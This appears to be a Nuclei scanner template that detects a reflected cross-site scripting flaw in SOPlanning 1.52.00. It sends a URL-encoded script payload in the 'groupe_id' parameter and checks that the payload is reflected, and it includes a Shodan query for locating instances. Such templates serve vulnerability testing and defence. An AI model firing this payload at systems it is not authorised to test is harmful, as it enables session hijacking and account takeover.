id: soplanning-xss

info:
  name: SOPlanning 1.52.00 Cross Site Scripting
  author: Kazgangap
  severity: high
  description: |
    SOPlanning v1.52.00 is vulnerable to reflected cross-site scripting (XSS) via the 'groupe_id' parameter.A remote unauthenticated attacker can inject JavaScript code leading to session hijacking or account takeover.
  reference:
    - https://packetstormsecurity.com/files/178434/SOPlanning-1.52.00-Cross-Site-Scripting.html
  metadata:
    vendor: soplanning
    product: soplanning
    shodan-query: html:"soplanning"
  tags: packetstorm,xss,soplanning

http:
  - method: GET
    path:
      - "{{BaseURL}}/www/process/groupe_save.php?saved=1&groupe_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C!--&nom=Project+New"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(document.domain)</script>"
        part: body

      - type: status
        status:
          - 200
